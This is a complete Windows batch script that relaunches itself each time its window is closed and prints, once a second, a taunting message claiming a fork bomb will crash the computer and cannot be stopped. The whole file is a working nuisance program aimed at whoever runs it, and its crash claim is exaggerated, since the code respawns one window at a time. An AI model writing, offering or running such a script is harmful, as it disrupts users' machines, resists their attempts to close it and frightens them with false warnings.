@echo off
if "%1" equ "Restarted" goto %1

:again
echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL
goto :again

:Restarted
echo Well done! You put a fork bomb on your computer. Once you press enter on the second BAT window (TFAV), this computer will crash. Enjoy this music while you wait. Also, you cant close this.
:loop
echo Well done! You put a fork bomb on your computer. Once you press enter on the second BAT window (TFAV), this computer will crash. Enjoy this music while you wait. Also, you cant close this.
timeout /T 1 > NUL
goto loop